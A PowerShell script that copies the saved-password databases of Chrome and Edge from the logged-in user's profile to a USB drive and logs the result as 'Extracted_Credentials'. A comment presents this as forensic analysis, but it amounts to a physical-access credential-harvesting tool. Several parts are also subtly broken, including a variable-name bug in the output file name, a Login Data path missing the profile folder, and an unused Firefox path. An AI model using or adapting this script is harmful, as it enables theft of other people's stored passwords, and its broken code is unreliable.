# Define the USB Drive Letter (Change 'E' to your actual USB drive letter)
$USBDrive = "E:"

# Create a folder for logs if it doesn't exist
$logDir = "$USBDrive\Creds"
if (-not (Test-Path $logDir)) {
    New-Item -ItemType Directory -Force -Path $logDir | Out-Null
}

$logFile = "$logDir\Extracted_Credentials.txt"
Clear-Content $logFile

# Function to extract Chrome/Edge passwords (requires decryption key)
function Get-BrowserPasswords {
    param($BrowserName, $Path)
    
    if (Test-Path $Path) {
        Add-Content -Path $logFile -Value "`n=== $BrowserName ==="
        
        # For Windows 10/11, passwords are stored in 'Login Data' SQLite DB
        # We use a simple approach: copy the file and parse with python or use Get-Credential if saved
        
        # Note: Full decryption requires the DPAPI key. 
        # Here we will dump the raw 'Login Data' file for forensic analysis.
        
        $loginData = "$Path\Login Data"
        if (Test-Path $loginData) {
            Copy-Item -Path $loginData -Destination "$logDir\$BrowserName_Login_Data.db" -Force
            Add-Content -Path $logFile -Value "Copied $BrowserName Login Database to: $logDir\$BrowserName_Login_Data.db"
        } else {
            Add-Content -Path $logFile -Value "$BrowserName not found or no passwords saved."
        }
    } else {
        Add-Content -Path $logFile -Value "$BrowserName path not found."
    }
}

# Get current user
$currentUser = $env:USERNAME

# Define paths for common browsers
$chromePath = "C:\Users\$currentUser\AppData\Local\Google\Chrome\User Data"
$edgePath   = "C:\Users\$currentUser\AppData\Local\Microsoft\Edge\User Data"
$firefoxPath= "C:\Users\$currentUser\AppData\Local\Mozilla\Firefox\Profiles"

# Extract data
Get-BrowserPasswords -BrowserName "Google Chrome" -Path $chromePath
Get-BrowserPasswords -BrowserName "Microsoft Edge" -Path $edgePath

# Add a timestamp
Add-Content -Path $logFile -Value "`n--- Extraction Complete at $(Get-Date) ---"

Write-Host "Credentials extracted to $logFile" -ForegroundColor Green